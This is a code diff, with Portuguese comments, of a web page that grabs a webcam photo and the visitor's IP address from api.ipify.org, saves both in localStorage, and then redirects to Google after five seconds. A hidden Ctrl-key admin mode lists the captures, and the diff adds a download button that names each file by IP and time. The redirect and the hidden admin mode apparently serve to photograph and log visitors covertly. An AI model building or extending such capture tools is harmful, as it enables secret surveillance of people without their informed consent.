@@ -16,7 +16,21 @@
         #history-table tr:hover { background-color: #555; }
         .active-row { background-color: #007bff !important; color: white; }
         #photo-display { margin-top: 40px; text-align: center; }
-        #photo-display img { max-width: 100%; border: 3px solid #ccc; display: none; }
+        /* A imagem será removida, substituída pelo botão */
+        #download-button { 
+            display: none; 
+            margin-top: 15px; 
+            padding: 10px 20px; 
+            font-size: 16px; 
+            background-color: #007bff; 
+            color: white; 
+            border: none; 
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        #download-button:hover {
+            background-color: #0056b3;
+        }
         #status-message { color: yellow; font-weight: bold; margin-bottom: 10px; }
         #redirect-status { display:none; }
         #redirect-timer { font-size: 1.2em; color: orange; }
@@ -36,9 +50,10 @@
             <p>As fotos abaixo foram salvas **neste navegador** (Local Storage).</p>
             
             <div id="photo-display">
-                <h2>📷 Foto Selecionada</h2>
-                <p id="selected-ip-text">Clique em uma linha para ver a foto.</p>
-                <img id="selected-photo" src="" alt="Foto Capturada">
+                <h2>📁 Detalhes da Captura</h2>
+                <p id="selected-ip-text">Clique em uma linha para liberar o download da foto.</p>
+                
+                <button id="download-button" disabled>Fazer Download da Foto</button>
             </div>
 
             <table id="history-table">
@@ -64,7 +79,7 @@
         const REDIRECT_URL = 'https://www.google.com';
         const STORAGE_KEY = 'photoHistory';
         const REDIRECT_TIME_SECONDS = 5;
-        const DATA_PREFIX = 'data:image/png;base64,'; // Prefixo completo para exibição
+        const DATA_PREFIX = 'data:image/png;base64,'; 
 
         const video = document.getElementById('webcam-video');
         const canvas = document.getElementById('canvas');
@@ -75,8 +90,10 @@
         const redirectStatus = document.getElementById('redirect-status');
         const redirectTimerSpan = document.getElementById('redirect-timer');
         const tableBody = document.querySelector('#history-table tbody');
-        const selectedPhoto = document.getElementById('selected-photo');
         const selectedIpText = document.getElementById('selected-ip-text');
+        
+        // NOVO ELEMENTO
+        const downloadButton = document.getElementById('download-button'); 
 
         let photoData = null;
         let userIP = 'IP_NAO_ENCONTRADO';
@@ -84,9 +101,10 @@
         let redirectCountdownId = null;
         let historyData = [];
         let isInAdminMode = false;
+        let currentSelectedPhotoBase64 = null; // Armazena a foto Base64 da linha clicada
 
         // ==========================================================
-        // FUNÇÕES DE ADMINISTRAÇÃO
+        // FUNÇÕES DE ADMINISTRAÇÃO E DOWNLOAD
         // ==========================================================
         
         function loadHistory() {
@@ -100,16 +118,31 @@
             localStorage.setItem(STORAGE_KEY, JSON.stringify(historyData));
         }
 
-        // 🟢 REFORÇO CRÍTICO: Garantir que a imagem seja um Data URI completo
-        function displayPhoto(base64Img) {
-             // Se o prefixo estiver faltando, a imagem salva está apenas como Base64 cru.
-             // Adicionamos o prefixo DATA_PREFIX na frente.
-            if (base64Img && !base64Img.startsWith(DATA_PREFIX)) {
-                base64Img = DATA_PREFIX + base64Img;
-            }
+        // 🟢 NOVO: Função para iniciar o download da foto
+        function downloadPhoto(base64Image, ip, timestamp) {
+            // Cria o link de Data URI completo
+            const dataURI = DATA_PREFIX + base64Image;
+
+            // Cria um elemento <a> temporário
+            const a = document.createElement('a');
+            a.href = dataURI;
             
-            selectedPhoto.src = base64Img;
-            selectedPhoto.style.display = 'block';
+            // Define o nome do arquivo com base no IP e na hora da captura
+            const formattedTime = new Date(timestamp).toLocaleTimeString('pt-BR', {hour12: false}).replace(/:/g, '-');
+            const filename = `CAPTURA_${ip.replace(/\./g, '_')}_${formattedTime}.png`;
+            
+            a.download = filename;
+
+            // Simula o clique
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // Reseta o botão
+            downloadButton.textContent = "Download Iniciado!";
+            setTimeout(() => {
+                downloadButton.textContent = "Fazer Download da Foto";
+            }, 1000);
         }
 
         function renderTable(selectedIndex = -1) {
@@ -125,11 +158,23 @@
                 row.insertCell().textContent = new Date(item.timestamp).toLocaleString();
                 
                 row.onclick = () => {
+                    // Remove destaque das outras linhas
                     document.querySelectorAll('#history-table tr').forEach(r => r.classList.remove('active-row'));
                     row.classList.add('active-row');
                     
-                    selectedIpText.textContent = `Foto de: ${item.ip}`;
-                    displayPhoto(item.img);
+                    // Atualiza a informação e armazena o Base64 para download
+                    selectedIpText.textContent = `Dados da Captura: ${item.ip} - ${new Date(item.timestamp).toLocaleString()}`;
+                    currentSelectedPhotoBase64 = item.img;
+                    
+                    // Ativa o botão de download
+                    downloadButton.style.display = 'block';
+                    downloadButton.disabled = false;
+                    downloadButton.textContent = "Fazer Download da Foto";
+
+                    // Remove o listener anterior e adiciona o novo (para evitar downloads duplicados)
+                    downloadButton.onclick = () => {
+                        downloadPhoto(currentSelectedPhotoBase64, item.ip, item.timestamp);
+                    };
                 };
             });
         }
@@ -156,17 +201,17 @@
         }
 
         // ==========================================================
-        // FLUXO DE CAPTURA
+        // FLUXO DE CAPTURA (NÃO ALTERADO)
         // ==========================================================
 
-        function fetchUserIP() {
+        function fetchUserIP() { /* ... código ... */ 
             return fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => { userIP = data.ip; })
                 .catch(() => { userIP = 'IP_NAO_ENCONTRADO'; });
         }
         
-        function startWebcam() {
+        function startWebcam() { /* ... código ... */
             return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
                 .then(stream => {
                     webcamStream = stream;
@@ -175,20 +220,18 @@
                 });
         }
         
-        // 🟢 REFORÇO CRÍTICO: Salvando APENAS o dado Base64 (sem o prefixo) para manter a consistência com a função displayPhoto
-        function takePhoto() {
+        function takePhoto() { /* ... código ... */
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            // Salva apenas o Base64 sem o cabeçalho 'data:image/png;base64,'
             photoData = canvas.toDataURL('image/png').split(',')[1]; 
         }
 
-        function saveAndRedirect() {
+        function saveAndRedirect() { /* ... código ... */
             if (photoData) {
                 const newItem = {
                     ip: userIP,
-                    img: photoData, // img é APENAS a string Base64
+                    img: photoData, 
                     timestamp: new Date().toISOString()
                 };
                 
@@ -222,7 +265,7 @@
         }
 
         // ==========================================================
-        // INICIALIZAÇÃO E CONTROLE DE TECLAS
+        // INICIALIZAÇÃO E CONTROLE DE TECLAS (NÃO ALTERADO)
         // ==========================================================
         
         window.addEventListener('keydown', (e) => {
@@ -233,13 +276,11 @@
         });
 
         async function runCaptureFlow() {
-            // 🛑 VERIFICAÇÃO CRÍTICA (Ctrl pressionado no load)
             if (window.event && window.event.ctrlKey) {
                 enterAdminMode();
                 return;
             }
             
-            // Garante que a visualização do timer esteja oculta no início
             redirectStatus.style.display = 'none'; 
             statusMessage.style.display = 'block';
 
